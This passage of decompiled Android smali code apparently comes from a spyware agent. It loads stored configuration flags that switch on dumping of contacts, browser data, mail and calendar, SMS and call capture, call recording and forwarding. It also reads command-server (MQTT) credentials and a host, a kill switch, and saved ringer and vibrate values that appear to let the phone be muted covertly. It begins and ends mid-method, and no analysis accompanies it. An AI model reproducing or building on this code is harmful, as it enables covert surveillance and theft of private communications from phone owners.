    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    return v0
.end method

.method public static d(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->x:I

    return-void
.end method

.method public static d(J)V
    .locals 0

    sput-wide p0, Lcom/network/b/b;->U:J

    return-void
.end method

.method public static declared-synchronized d(Landroid/content/Context;)V
    .locals 5

    const-class v1, Lcom/network/b/b;

    monitor-enter v1

    :try_start_0
    const-string v0, "Read Preferences"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-nez p0, :cond_0

    const-string v0, "readPreferences: context is NULL!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :goto_0
    monitor-exit v1

    return-void

    :cond_0
    :try_start_1
    const-string v0, "NetworkPreferences"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "NetworkWindowResizer"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_1

    const-string v0, "token == null getSettingsFromBH"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    const/4 v2, 0x1

    const-string v3, "LOG_AGENT_FIRST_TIME_RUN"

    invoke-static {v0, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    invoke-static {p0}, Lcom/network/h/b;->f(Landroid/content/Context;)Z

    :cond_1
    const-string v0, "NetworkPreferences"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "NetworkWindowResizer"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/b/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/android/SmsReceiver;->b:Ljava/lang/String;

    const-string v2, "NetworkWindowSim"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/android/BootReceiver;->a:Ljava/lang/String;

    const-string v2, "WindowTargetSms"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/b/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->g:Ljava/lang/String;

    invoke-static {p0}, Lcom/network/b/b;->g(Landroid/content/Context;)V

    invoke-static {v0}, Lcom/network/b/b;->a(Landroid/content/SharedPreferences;)V

    const-string v2, "lastComunication"

    const-wide/16 v3, 0x0

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->i:Ljava/lang/Long;

    const-string v2, "lastSend"

    const-wide/16 v3, 0x0

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    sput-wide v2, Lcom/network/b/b;->H:J

    const-string v2, "lastReceive"

    const-wide/16 v3, 0x0

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    sput-wide v2, Lcom/network/b/b;->I:J

    const-string v2, "send"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->J:I

    const-string v2, "receive"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->K:I

    const-string v2, "packageVersion"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->l:Ljava/lang/String;

    const-string v2, "vulnarbilityIndicator"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->m:Ljava/lang/String;

    const-string v2, "sesseions"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->L:I

    const-string v2, "wasPhoneWasUnmutedAfterTapNicly"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->M:I

    const-string v2, "originalVibrateValue"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->O:I

    const-string v2, "originalRingerValue"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->N:I

    const-string v2, "failureCount"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->k:I

    const-string v2, "errorCode"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    int-to-byte v2, v2

    sput-short v2, Lcom/network/b/b;->j:S

    const-string v2, "maxTimeWithNoComunication"

    const v3, 0x4f1a00

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->P:Ljava/lang/Integer;

    const-string v2, "grace"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->R:Z

    const-string v2, "commandTimeStamp"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/android/a/c;->b:Ljava/lang/String;

    const-string v2, "adlocation"

    const-wide/16 v3, 0x0

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    sput-wide v2, Lcom/network/b/b;->S:J

    const-string v2, "adrate"

    const-wide/16 v3, 0x0

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    sput-wide v2, Lcom/network/b/b;->T:J

    const-string v2, "userNetwork"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->o:Ljava/lang/String;

    const-string v2, "installation"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->e:Ljava/lang/String;

    const-string v2, "windowYuliyus"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->W:Ljava/lang/Boolean;

    const-string v2, "window canada"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    const-string v2, "graceTime"

    const-wide/16 v3, 0x0

    invoke-interface {v0, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    sput-wide v2, Lcom/network/b/b;->h:J

    const-string v2, "finish"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->p:Z

    const-string v2, "dumpContacts"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->r:Z

    const-string v2, "dumpBrowserData"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->s:Z

    const-string v2, "callWindow"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->q:Z

    const-string v2, "smsWindow"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->t:Z

    const-string v2, "dumpCalander"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->u:Z

    const-string v2, "firstRun"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->v:Z

    const-string v2, "dumpMails"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->w:Z

    const-string v2, "allowRomingType"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->Y:I

    const-string v2, "logNetwork"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/android/c/a/b;->d:Ljava/lang/String;

    const-string v2, "forwarding"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/android/monitor/observer/t;->a:Z

    const-string v2, "romingSetted"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    invoke-static {v2}, Lcom/network/android/AndroidCallDirectWatcher;->a(Z)V

    const-string v2, "ScreenTimeout"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->x:I

    const-string v2, "wanted_debug_level"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->A:I

    const-string v2, "screenProximtySensor"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->y:I

    const-string v2, "url address"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/b/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->z:Ljava/lang/String;

    const-string v2, "did_we_restart_after_upgrade_already"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->B:Z

    const-string v2, "mqttPassword"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->Z:Ljava/lang/String;

    const-string v2, "mqttAllowedConnectionType"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->ad:I

    const-string v2, "should_use_mqtt"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/b/b;->aa:Z

    const-string v2, "mqttRecInt"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->ab:I

    const-string v2, "mqttUsername"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->ac:Ljava/lang/String;

    const-string v2, "mqttIdPref"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->ae:Ljava/lang/String;

    const-string v2, "mqttQos"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->af:I

    const-string v2, "mqttKaTimer"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->ag:I

    const-string v2, "mqttRecCount"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    sput v2, Lcom/network/b/b;->ah:I

    const-string v2, "mqttPort"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->ai:Ljava/lang/String;

    const-string v2, "mqttHost"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->aj:Ljava/lang/String;

    const-string v2, "networkKill"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, Lcom/network/android/a/c;->i:Z

    const-string v2, "firstRunIndex"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/android/m;->a:Ljava/lang/String;

    const-string v2, "pollingInterval"

    const/16 v3, 0x708

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    sput-object v2, Lcom/network/b/b;->al:Ljava/lang/Integer;

    const-string v2, "local"

    const/4 v3, 0x0

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->C:Ljava/lang/Boolean;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    :try_start_2
    const-string v2, "readPreferences"

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto/16 :goto_0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method public static d(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->ac:Ljava/lang/String;

    return-void
.end method

.method public static d()Z
    .locals 1

    sget-object v0, Lcom/network/b/b;->W:Ljava/lang/Boolean;

    if-nez v0, :cond_0

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    :cond_0
    sget-object v0, Lcom/network/b/b;->W:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    return v0
.end method

.method public static e(Landroid/content/Context;)Ljava/lang/Boolean;
    .locals 1

    const-string v0, "getCallRecord"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    :goto_0
    return-object v0

    :cond_0
    invoke-static {p0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    sget-object v0, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    goto :goto_0
.end method

.method public static e(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->O:I

    return-void
.end method

.method public static e(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->ae:Ljava/lang/String;

    return-void
.end method

.method public static e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->F:[Ljava/lang/String;

    return-object v0
.end method

.method public static f()Ljava/lang/String;
    .locals 3

    sget-object v0, Lcom/network/b/b;->f:Ljava/lang/String;

    if-nez v0, :cond_0

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    const-string v1, "NetworkPreferences"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->a(Landroid/content/SharedPreferences;)V

    :cond_0
    sget-object v0, Lcom/network/b/b;->f:Ljava/lang/String;

    return-object v0
.end method

.method public static f(Landroid/content/Context;)Ljava/util/List;
    .locals 4

    :try_start_0
    const-string v0, "getUssdPatternList"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/b/b;->ao:Ljava/util/Vector;

    if-nez v0, :cond_2

    sget-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;

    if-nez v0, :cond_2

    invoke-static {p0}, Lcom/network/b/b;->h(Landroid/content/Context;)[Ljava/lang/String;

    sget-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;

    array-length v0, v0

    if-nez v0, :cond_1

    :cond_0
    const-string v0, "getUssdPatternList no USSD plocking list"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/b/b;->ao:Ljava/util/Vector;

    :goto_0
    return-object v0

    :cond_1
    new-instance v0, Ljava/util/Vector;

    sget-object v1, Lcom/network/b/b;->am:[Ljava/lang/String;

    array-length v1, v1

    invoke-direct {v0, v1}, Ljava/util/Vector;-><init>(I)V

    sput-object v0, Lcom/network/b/b;->ao:Ljava/util/Vector;

    const/4 v0, 0x0

    move v1, v0

    :goto_1
    sget-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;

    array-length v0, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-ge v1, v0, :cond_2

    :try_start_1
    sget-object v0, Lcom/network/b/b;->am:[Ljava/lang/String;

    aget-object v0, v0, v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "getUssdPatternList i-"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " compile regx:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    sget-object v2, Lcom/network/b/b;->ao:Ljava/util/Vector;

    invoke-virtual {v2, v1, v0}, Ljava/util/Vector;->add(ILjava/lang/Object;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_2
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "getUssdPatternList paterns iter "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "getUssdPatternList: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_2
    sget-object v0, Lcom/network/b/b;->ao:Ljava/util/Vector;

    goto :goto_0
.end method

.method public static f(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->y:I

    return-void
.end method

.method public static f(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->ai:Ljava/lang/String;

    return-void
.end method

.method public static g()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/b/b;->g:Ljava/lang/String;

    if-nez v0, :cond_0

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    :cond_0
    sget-object v0, Lcom/network/b/b;->g:Ljava/lang/String;

    return-object v0
.end method

.method public static g(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->Y:I

    return-void
.end method

.method private static g(Landroid/content/Context;)V
    .locals 6

    const/4 v0, 0x0

    :try_start_0
    const-string v1, "Read Addreses started"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v1, "NetworkWindowAddresess"

    const/4 v2, 0x0

    invoke-virtual {p0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    if-nez v1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-interface {v1}, Landroid/content/SharedPreferences;->getAll()Ljava/util/Map;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-interface {v2}, Ljava/util/Map;->size()I

    move-result v1

    if-eqz v1, :cond_0

    invoke-interface {v2}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/Set;->size()I

    move-result v1

    new-array v3, v1, [Ljava/lang/String;

    invoke-interface {v2}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v4

    move v1, v0

    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-interface {v2, v0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v3, v1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v5, " -  Read Address: "

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    aget-object v5, v3, v1

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_1

    :cond_2
    invoke-static {v3}, Lcom/network/b/b;->b([Ljava/lang/String;)V

    const-string v0, "Read Addreses ended"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "readData: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static g(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->aj:Ljava/lang/String;

    return-void
.end method

.method private static h(Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    if-nez p0, :cond_0

    const/4 p0, 0x0

    :goto_0
    return-object p0

    :cond_0
    :try_start_0
